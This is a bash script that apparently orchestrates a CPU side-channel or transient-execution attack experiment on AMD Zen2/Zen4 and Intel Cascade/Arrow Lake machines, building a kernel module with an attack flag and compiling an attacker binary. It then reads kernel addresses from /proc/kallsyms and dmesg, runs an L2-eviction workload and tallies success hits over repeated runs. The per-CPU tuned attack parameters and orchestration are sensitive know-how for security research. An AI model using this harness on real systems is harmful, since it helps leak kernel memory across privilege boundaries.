#!/bin/bash

if [[ "$*" == *"-zen2"* ]]; then
	PLATFORM="AMD"
    PLATFORM_FLAGS="-DAMD -DZEN2"
    L2_HASH_FUNCTION="-DLINEAR"
    PL2_WAYS=13
    BEST_I=7500
    BEST_S=1
    SIBLING_CORE=8
	INTERRUPT_OFFSET=0x123e
	NOPS=0
elif [[ "$*" == *"-zen4"* ]]; then
	PLATFORM="AMD"
    PLATFORM_FLAGS="-DAMD -DZEN4"
    L2_HASH_FUNCTION="-DCOMPLEX"
    PL2_WAYS=13
    BEST_I=5000
    BEST_S=1
    SIBLING_CORE=33
    INTERRUPT_OFFSET=0x140127f
	NOPS=0
elif [[ "$*" == *"-cascade"* ]]; then
	PLATFORM="INTEL"
    PLATFORM_FLAGS="-DINTEL -DCASCADE"
	L2_HASH_FUNCTION="-DLINEAR"
    PL2_WAYS=17
    BEST_I=751
    BEST_S=151
    SIBLING_CORE=48
	NOPS=0
elif [[ "$*" == *"-arrow"* ]]; then
    PLATFORM="INTEL"
    PLATFORM_FLAGS="-DINTEL -DARROW"
    L2_HASH_FUNCTION="-DLINEAR"
    PL2_WAYS=17
    BEST_I=251
    BEST_S=551
    SIBLING_CORE=0
    NOPS=0
else
	echo "Pick -zen2, -zen4, -cascade or -arrow"
	exit
fi

ITERATIONS=100

#for BEST_I in $(seq 1 50 5000); do
#	for BEST_S in $(seq 1 50 1000); do

for EXTRA_FLAGS in ""; do
	echo "$EXTRA_FLAGS"

	make clean > /dev/null 2>&1
	sudo rmmod kprobe_logger >/dev/null 2>&1
	make CFLAGS_MODULE="-DVICTIM_NOPS=$NOPS -DATTACK $PLATFORM_FLAGS $EXTRA_FLAGS" > /dev/null 2>&1

	pkill workload

	# Only interesting for AMD
	TEXT_BASE=$(sudo grep ' _text' /proc/kallsyms | head -n 1 | awk '{print $1}')
	TRAINING_INTERRUPT=$(printf "%016x" $((16#$TEXT_BASE + INTERRUPT_OFFSET)))

	counts_hits=()
	counts_train=()	
	counts_consume=()
	for rep in $(seq 1 $ITERATIONS); do
		sudo insmod kprobe_logger.ko

		GADGET_ADDR=$(sudo dmesg | grep "gadget_start" | tail -n 1 | sed 's/.*gadget_start: //') #AMD only

		gcc attacker_c.c -o attacker_c -DINTERVAL=$BEST_I -DSPINNING=$BEST_S -DGADGET_ADDR=0x$GADGET_ADDR -DTRAINING_INTERRUPT=0x$TRAINING_INTERRUPT $PLATFORM_FLAGS -no-pie

		TMP=/tmp/prog.out

		if [[ "$PLATFORM" == "AMD" ]]; then
			PA=$(sudo dmesg | grep "victim_start" | tail -n 1 | sed -n 's/.*PA: \([0-9a-fA-F]*\).*/\1/p')
		else
			PA=$(sudo dmesg | grep "k_userptr[0]" | tail -n 1 | sed -n 's/.*PA: \([0-9a-fA-F]*\).*/\1/p')
		fi

if [[ "$*" == *"-zen2"* ]] || [[ "$*" == *"-zen4"* ]]; then
		gcc workload.c -o workload -DTARGET_PA=0x$PA $L2_HASH_FUNCTION -DWAYS=$PL2_WAYS >/dev/null 2>&1
		taskset -c $SIBLING_CORE ./workload &
		WORKLOAD_PID=$!

		sleep 5

fi

		PID=$(
		{ taskset -c 0 ./attacker_c | tee "$TMP" & } | {
			IFS= read -r FIRST
			echo "$FIRST"
			cat >/dev/null
		}
		)

		hits=$(awk -F'hits = ' '/hits =/{gsub(/[^0-9]/,"",$2); print $2}' "$TMP")

		# echo $hits

		sudo rmmod kprobe_logger

		c_train=$(sudo dmesg | grep 'counter_c_1' | tail -n1 | awk '{print $NF}')

		if [[ "$PLATFORM" == "AMD" ]]; then
			c_consume=$(sudo dmesg | grep 'counter_victim' | tail -n1 | awk '{print $NF}')
		else
			c_consume=$(sudo dmesg | grep 'counter_c_2' | tail -n1 | awk '{print $NF}')	
		fi

		counts_hits+=("$hits")
		counts_train+=("$c_train")
		counts_consume+=("$c_consume")

if [[ "$*" == *"-zen2"* ]] || [[ "$*" == *"-zen4"* ]]; then
		kill $WORKLOAD_PID
		wait $WORKLOAD_PID 2>/dev/null
fi
	done

	mid=$(( ITERATIONS / 2 ))

	sorted_hits=($(printf "%s\n" "${counts_hits[@]}" | sort -n))
	med_hits=$(( (sorted_hits[mid-1] + sorted_hits[mid]) / 2 ))
		
	sum_hits=0
	for v in "${sorted_hits[@]}"; do
		sum_hits=$((sum_hits + v))
	done

	avg_hits=$((sum_hits / ITERATIONS))

	sorted_train=($(printf "%s\n" "${counts_train[@]}" | sort -n))
	med_train=$(( (sorted_train[mid-1] + sorted_train[mid]) / 2 ))

	sorted_consume=($(printf "%s\n" "${counts_consume[@]}" | sort -n))
	med_consume=$(( (sorted_consume[mid-1] + sorted_consume[mid]) / 2 ))

	last=$(( ITERATIONS - 1 ))
	if [[ "$PLATFORM" == "AMD" ]]; then
		printf "INTERVAL = %6d, SPINNING = %6d  ->  %d-%d (min %d, max %d), %d (min %d, max %d)\n" "$BEST_I" "$BEST_S" "$med_hits" "$avg_hits" "${sorted_hits[0]}" "${sorted_hits[last]}" "$med_consume" "${sorted_consume[0]}" "${sorted_consume[last]}"
	else
		printf "INTERVAL = %6d, SPINNING = %6d  ->  %d-%d (min %d, max %d), %d (min %d, max %d), %d (min %d, max %d)\n" "$BEST_I" "$BEST_S" "$med_hits" "$avg_hits" "${sorted_hits[0]}" "${sorted_hits[last]}" "$med_train" "${sorted_train[0]}" "${sorted_train[last]}" "$med_consume" "${sorted_consume[0]}" "${sorted_consume[last]}"
	fi

	#echo ""

done
 #done
 #done
